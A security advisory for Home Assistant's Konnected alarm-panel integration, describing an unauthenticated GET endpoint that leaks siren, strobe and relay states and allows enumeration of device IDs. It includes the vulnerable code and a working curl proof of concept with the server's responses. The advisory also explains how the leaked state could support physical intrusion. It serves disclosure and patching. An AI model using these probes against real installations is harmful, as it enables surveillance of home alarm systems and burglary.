# [H] Home Assistant: Konnected alarm-panel switch state and zone topology disclosed to unauthenticated actors on the LAN

## Summary
Severity: High
Advisory: GHSA-x84v-g949-293w
CVE: CVE-2026-54317
CWE: CWE-200, CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-x84v-g949-293w
Type: github-advisory

## Affected
- PyPI: `homeassistant` — affected >=0 <2026.6.0

## Details
### Summary

The Konnected integration registers an HTTP endpoint, `KonnectedView` (`homeassistant/components/konnected/__init__.py`), that is marked as **not requiring authentication** (`requires_auth = False`). A comment next to that line says auth is instead handled "via the access token from configuration."

That promise is only half true:

- **Write requests (POST and PUT)** are handled by `update_sensor()`, which *does* check the request's `Authorization: Bearer <token>` header against the integration's stored access tokens (using `hmac.compare_digest`).
- **Read requests (GET)** are handled by a separate `get()` method that has **no authentication check at all.**

By sending GET requests to `/api/konnected/device/{device_id}?zone=N`, any unauthenticated client on the LAN can:

1. **Enumerate configured Konnected device IDs** — the endpoint returns a clean 404-vs-200 difference that acts as an oracle for which devices exist.
2. **Read switch output states** — the on/off state of every switch output (siren, strobe, and relay outputs of the alarm panel).
3. **Read the panel's zone topology** — how the alarm panel's zones are configured.
4. **Trigger panel connections** — each unauthenticated GET forces one outbound `panel.async_connect()` call to the Konnected hardware on the LAN.

The same URL that correctly rejects unauthenticated POST and PUT requests silently serves unauthenticated GET requests, leaking alarm-panel state and device topology to anyone who can reach Home Assistant's HTTP port (8123 on the LAN by default).

### Details

This is the threat-model boundary "unauth to auth" the upstream security policy treats as fileable. The same boundary produced CVE-2026-34205 (`Unauthenticated app endpoints exposed to local network via host network mode`, CVSS 9.7 CRITICAL, March 2026) and CVE-2023-50715 (`User accounts disclosed to unauthenticated actors on the LAN`, CVSS 4.2 MODERATE, December 2023). The Konnected gap is structurally identical: a HomeAssistantView with `requires_auth = False` that returns information about configured devices to anyone who can reach the HTTP port.

Confirmed end-to-end against `ghcr.io/home-assistant/home-assistant:2026.5.2`. The Proof of Concept section below has seven captures. Step 1 cites the three load-bearing source ranges (view registration, the auth check that only POST/PUT use, the GET handler that omits it). Step 2 is the control: POST and PUT on the same URL return `401 unauthorized` without a Bearer token, proving the integration does have an auth check, just only on the write methods. Step 3 is the bug: GET on the same URL with no Authorization header returns `200 {"zone":"5","state":1}` for the siren-output zone, equivalent payload for the strobe and relay-output zones. Step 4 exercises the enumeration oracle: unknown `device_id` returns a 404 with a distinct message from a known `device_id` with an unknown zone, which a brute-forcer uses to map the device-ID and zone space. Step 5 captures the connection-amplification side effect by firing 10 unauthenticated GETs and observing 10 `panel.async_connect()` invocations on the panel side. Step 6 shows that a deliberately wrong `Authorization` header produces the same response as no header at all, confirming the auth header is not consulted on GET. Step 7 captures the HA startup log line that registers `KonnectedView`.

### Threat model

Home Assistant's HTTP server binds to the LAN at port 8123 by default. A Konnected alarm panel is a wired smart-home hardware product whose primary use case is *alarm and security*: zones 1-6 typically read door/window/glass-break sensors, switches 5-8 drive siren, strobe, and relay outputs that control the alarm itself or external systems such as garage-door openers, entry chimes, or armed-disable interlocks. The state an attacker reads through this bug is precisely the live status of those outputs and inputs.

The attacker model upstream policy explicitly treats as in-scope is the LAN-adjacent unauthenticated client: a guest who joined the wifi, a neighbor on shared coffee-shop wifi, a malicious device that reached the LAN via a separately compromised IoT product, an attacker who landed via a flat office network, or an attacker who pivoted from a VPN endpoint. None of these positions grant an access token. All of them grant the network reachability the bug requires.

The same endpoint is the receiver for legitimate push updates from the Konnected hardware, which is why `requires_auth = False` exists in the first place. The intent was to enforce a shared access token on the body. That intent is present in `update_sensor()` and absent in `get()`.

### Impact

- **Alarm-system reconnaissance enabling physical intrusion.** A `200 {"zone":"5","state":1}` response on the siren zone tells an attacker the siren is firing right now, which means a burglary is in progress and the operator may be away or distracted. A `state:0` on the same zone says the panel is quiet. The same applies to strobes, armed-disable relays, and any switch the operator wired through Konnected. This is the intelligence a physical attacker explicitly seeks before entering a property.
- **Topology disclosure.** Probing zones 1 through 12 across a known device_id maps the alarm panel: which zones are sensors, which are switches, which switches are configured for which output. Combined with manufacturer documentation, the topology tells an attacker which physical control points to bypass.
- **Device ID brute force.** The 404 "Device <id> not configured" oracle on unknown IDs versus 404 "Switch on zone or pin <n> not configured" on known IDs with unknown zones, versus 200 with state on full hits, is a clean four-state oracle. Konnected hardware derives `device_id` from its NIC MAC address; production hardware ships with a small set of manufacturer OUI prefixes. The brute force space is on the order of 2^24, trivially scannable from any LAN host with no rate limit.
- **Outbound connection amplification.** Line 397 of `__init__.py` fires `hass.async_create_task(panel.async_connect())` on every successful GET. An unauth attacker drives N outbound connect attempts toward the (typically LAN-private) Konnected hardware with N unauth GETs, no rate limit, no auth log. A 10-rps sustained scan produces a constant connect storm against the panel hardware that, depending on Konnected firmware, may interfere with legitimate push delivery or cause spurious connect/disconnect cycles visible in the operator's notification stream.
- **No auth trail.** The GET handler logs nothing at INFO level. An attacker can probe this endpoint at arbitrary depth and leave no record in `home-assistant.log` unless DEBUG logging is enabled for the integration.

### Affected code

`homeassistant/components/konnected/__init__.py:296-301`, the view registration. The comment on line 301 is load-bearing for the bug: it says auth happens via the configured access token, but that promise is only kept on the POST/PUT path.

```python
class KonnectedView(HomeAssistantView):
    """View creates an endpoint to receive push updates from the device."""

    url = UPDATE_ENDPOINT  # /api/konnected/device/{device_id:[a-zA-Z0-9]+}
    name = "api:konnected"
    requires_auth = False  # Uses access token from configuration
```

`homeassistant/components/konnected/__init__.py:313-335`, the auth check that lives inside `update_sensor()`. POST and PUT call this; GET does not.

```python
async def update_sensor(self, request: Request, device_id) -> Response:
    """Process a put or post."""
    hass = request.app[KEY_HASS]
    data = hass.data[DOMAIN]

    auth = request.headers.get(AUTHORIZATION)
    tokens = []
    if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
        tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
    tokens.extend(
        [
            entry.data[CONF_ACCESS_TOKEN]
            for entry in hass.config_entries.async_entries(DOMAIN)
            if entry.data.get(CONF_ACCESS_TOKEN)
        ]
    )
    if auth is None or not next(
        (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
        False,
    ):
        return self.json_message(
            "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
        )
```

`homeassistant/components/konnected/__init__.py:385-438`, the GET handler with no authentication. Note line 397 firing `panel.async_connect()` before any reachable auth check and before any rate-limit logic.

```python
async def get(self, request: Request, device_id) -> Response:
    """Return the current binary state of a switch."""
    hass = request.app[KEY_HASS]
    data = hass.data[DOMAIN]

    if not (device := data[CONF_DEVICES].get(device_id)):
        return self.json_message(
            f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
        )

    if (panel := device.get("panel")) is not None:
        # connect if we haven't already
        hass.async_create_task(panel.async_connect())

    # Our data model is based on zone ids but we convert from/to pin ids
    # based on whether they are specified in the request
    try:
        zone_num = str(
            request.query.get(CONF_ZONE) or PIN_TO_ZONE[request.query[CONF_PIN]]
        )
        zone = next(
            switch
            for switch in device[CONF_SWITCHES]
            if switch[CONF_ZONE] == zone_num
        )

    except StopIteration:
        zone = None
    except KeyError:
        zone = None
        zone_num = None

    if not zone:
        target = request.query.get(
            CONF_ZONE, request.query.get(CONF_PIN, "unknown")
        )
        return self.json_message(
            f"Switch on zone or pin {target} not configured",
            status_code=HTTPStatus.NOT_FOUND,
        )

    resp = {}
    if request.query.get(CONF_ZONE):
        resp[CONF_ZONE] = zone_num
    elif zone_num:
        resp[CONF_PIN] = ZONE_TO_PIN[zone_num]

    # Make sure entity is setup
    if zone_entity_id := zone.get(ATTR_ENTITY_ID):
        resp["state"] = self.binary_value(
            hass.states.get(zone_entity_id).state,
            zone[CONF_ACTIVATION],
        )
        return self.json(resp)
```

The four-state response oracle that powers the brute force:

| Probe | Response | Status |
|---|---|---|
| Unknown `device_id` | `{"message":"Device <id> not configured"}` | 404 |
| Known `device_id`, no `zone` or `pin` parameter | `{"message":"Switch on zone or pin unknown not configured"}` | 404 |
| Known `device_id`, unknown `zone` | `{"message":"Switch on zone or pin <n> not configured"}` | 404 |
| Known `device_id`, known `zone` | `{"zone":"<n>","state":0\|1}` | 200 |

`homeassistant/components/konnected/const.py:45`, the URL pattern:

```python
ENDPOINT_ROOT = "/api/konnected"
UPDATE_ENDPOINT = ENDPOINT_ROOT + r"/device/{device_id:[a-zA-Z0-9]+}"
```

### Proof of concept

Reproduction environment is a single Docker container of Home Assistant Core 2026.5.2 with a small `custom_components/konnected_poc/` shim that primes `hass.data[konnected]` with a representative alarm-panel layout and registers the same `KonnectedView` class through `hass.http.register_view`. The shim does not change the bug surface; it is the same class the upstream integration registers at line 248. All seven evidence captures below come from one live run against the container.

#### Environment

```
host: Darwin 25.2.0 arm64
docker: Docker version 29.4.3, build 055a478ea9
ha image: ghcr.io/home-assistant/home-assistant:2026.5.2

konnected source SHA-256 (the file containing the bug):
33e1e56b8fe0c28aa2aee060e214a501c813655297b33272e83c2f2d51adc3b6  /usr/src/homeassistant/homeassistant/components/konnected/__init__.py

konnected_poc shim startup log:
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
```

#### Step 1: cite the three load-bearing source ranges inside the running container

```
$ docker exec ha-konnected-poc sh -c '
    pkg=$(python -c "import homeassistant.components.konnected as m; import os; print(os.path.dirname(m.__file__))")
    sed -n "296,305p" "$pkg/__init__.py"
    sed -n "313,336p" "$pkg/__init__.py"
    sed -n "385,438p" "$pkg/__init__.py"
'

--- view registration, requires_auth = False (line 301) ---
class KonnectedView(HomeAssistantView):
    """View creates an endpoint to receive push updates from the device."""

    url = UPDATE_ENDPOINT
    name = "api:konnected"
    requires_auth = False  # Uses access token from configuration

--- update_sensor() enforces Bearer-token auth via hmac.compare_digest ---
    async def update_sensor(self, request: Request, device_id) -> Response:
        """Process a put or post."""
        hass = request.app[KEY_HASS]
        data = hass.data[DOMAIN]

        auth = request.headers.get(AUTHORIZATION)
        tokens = []
        if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
            tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
        tokens.extend(
            [
                entry.data[CONF_ACCESS_TOKEN]
                for entry in hass.config_entries.async_entries(DOMAIN)
                if entry.data.get(CONF_ACCESS_TOKEN)
            ]
        )
        if auth is None or not next(
            (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
            False,
        ):
            return self.json_message(
                "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
            )

--- get() handler, no auth check anywhere in the body ---
    async def get(self, request: Request, device_id) -> Response:
        """Return the current binary state of a switch."""
        hass = request.app[KEY_HASS]
        data = hass.data[DOMAIN]

        if not (device := data[CONF_DEVICES].get(device_id)):
            return self.json_message(
                f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
            )

        if (panel := device.get("panel")) is not None:
            # connect if we haven't already
            hass.async_create_task(panel.async_connect())
        ...
        return self.json(resp)
```

#### Step 2: control. POST and PUT on the same URL return 401 without a Bearer token

The integration does enforce a Bearer-token check; the policy is just only applied to the write methods.

```
$ curl -sS -i -X POST -H "Content-Type: application/json" \
    -d '{"zone":"5","state":"1"}' \
    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122

HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 26

{"message":"unauthorized"}

$ curl -sS -i -X PUT -H "Content-Type: application/json" \
    -d '{"zone":"5","state":"1"}' \
    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122

HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 26

{"message":"unauthorized"}
```

#### Step 3: the bug. GET returns alarm-panel switch state with no Authorization header

Three zones queried unauthenticated. Each returns the live binary state of a switch output on the configured Konnected alarm panel.

```
$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"zone":"5","state":1}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=6"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"6","state":1}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=7"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"7","state":1}
```

Zone 5 is the siren output of the panel in this configuration. Zone 6 is the strobe. Zone 7 is the relay output wired to the garage arm-disable circuit. The unauthenticated attacker learns each output is currently active.

#### Step 4: enumeration oracle. Three distinct response shapes power the brute force

```
$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/ffffffffffff?zone=5"

HTTP/1.1 404 Not Found
Content-Length: 48

{"message":"Device ffffffffffff not configured"}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=99"

HTTP/1.1 404 Not Found
Content-Length: 53

{"message":"Switch on zone or pin 99 not configured"}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"5","state":1}
```

An attacker sweeping the `device_id` space sees the `Device <id> not configured` message until a real device matches, at which point the `Switch on zone or pin <n> not configured` message starts appearing. Then a 12-iteration zone sweep maps the panel's full output topology.

#### Step 5: connection amplification. N unauth GETs drive N outbound `panel.async_connect()` calls

10 unauthenticated GET requests at line rate. The `panel.async_connect()` invocations logged by the panel-side stub confirm line 397 of `__init__.py` fires unconditionally on every successful GET, before any reachable rate-limit logic and before any reachable auth check.

```
$ for i in $(seq 1 10); do
    curl -sS -o /dev/null -w "GET #%{http_code}\n" \
      "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
  done

GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200

$ docker logs ha-konnected-poc 2>&1 | grep "async_connect() invoked"

2026-05-18 15:23:55.893 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #1). In production this is an outbound HTTPS call to the configured Konnected hardware.
2026-05-18 15:23:55.900 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #2). ...
2026-05-18 15:23:55.907 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #3). ...
2026-05-18 15:23:55.921 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #4). ...
2026-05-18 15:23:55.928 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #5). ...
2026-05-18 15:23:55.937 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #6). ...
2026-05-18 15:23:55.944 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #7). ...
2026-05-18 15:23:55.951 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #8). ...
2026-05-18 15:23:55.957 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #9). ...
2026-05-18 15:23:55.964 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #10). ...
```

A sustained scan trivially fills the operator's panel side with retry storms. In production the call is an outbound HTTPS connection to the Konnected hardware on the LAN.

#### Step 6: the Authorization header is ignored on GET

Identical responses with no header, a deliberately wrong header, and no header again. This rules out any caching artifact and confirms `get()` never reads the auth state.

```
$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}

$ curl -sS -H "Authorization: Bearer this-token-is-completely-wrong" \
    "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}

$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}
```

The wrong-Authorization case is the load-bearing one. If the GET handler ever consulted the header, it would either accept it (no, because the token is wrong) or reject it (no, because the response is 200 with state). The handler never reads `request.headers["Authorization"]`.

#### Step 7: startup log confirms the view is registered and the integration is loaded

```
2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setting up konnected
2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setup of domain konnected took 0.00 seconds
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
```

The `konnected` integration shipped in core 2026.5.2 is loaded normally. The `konnected_poc` shim runs after it, registering the same `KonnectedView` class through `hass.http.register_view` and seeding `hass.data[konnected][devices]` with a representative alarm-panel configuration. The bug surface is the same `KonnectedView` class the upstream integration registers at `__init__.py:248` on every production install.

### Workaround

Migrate to the EspHome integration, as suggested in the existing repair issue for the Konnected integration.

### Fix

The Konnected integration was removed in Home Assistant Core 2026.6.0. It had been deprecated for some time.

## References
- https://github.com/home-assistant/core/security/advisories/GHSA-x84v-g949-293w
- https://nvd.nist.gov/vuln/detail/CVE-2026-54317
- https://github.com/home-assistant/core
- https://github.com/pypa/advisory-database/tree/main/vulns/homeassistant/PYSEC-2026-241.yaml
